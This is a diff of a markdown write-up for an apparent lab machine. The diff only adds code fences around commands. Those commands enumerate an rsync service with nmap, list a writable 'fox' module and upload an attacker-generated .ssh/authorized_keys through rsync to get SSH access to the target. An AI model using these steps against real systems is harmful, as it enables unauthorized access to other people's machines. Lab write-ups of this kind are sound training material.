@@ -30,8 +30,9 @@ Nmap done: 1 IP address (1 host up) scanned in 27.36 seconds
 Rsync is a directory sharing protocol used on Unix systems
 
 The protocol can be scanned for available folders using an nmap script
+~~~
 nmap -sV --script "rsync-list-modules" -p 873 192.168.194.126
-
+~~~
 ~~~
 PORT    STATE SERVICE VERSION
 873/tcp open  rsync   (protocol version 31)
@@ -40,8 +41,9 @@ PORT    STATE SERVICE VERSION
 ~~~
 
 The contents of the fox folder revealed the contents of an empty home directory
+~~~
 rsync -av --list-only rsync://192.168.194.126/fox
-
+~~~
 ~~~
 receiving incremental file list
 drwxr-xr-x          4,096 2021/01/21 14:21:59 .
@@ -89,8 +91,9 @@ The key's randomart image is:
 ~~~
 
 2. Copy our .ssh directory locally
+~~~
 cp -R /home/kali/.ssh .
-
+~~~
 3. Rename id_rsa.pub (our public key) to authorized_keys before transferring to the target
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail]
@@ -100,8 +103,9 @@ cp -R /home/kali/.ssh .
 ~~~
 
 3. Upload the .ssh file (containing authorized_keys) to Rsync
+~~~
 rsync -av /home/kali/Desktop/Fail/.ssh rsync://fox@192.168.194.126/fox
-
+~~~
 4. SSH into the target machine
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
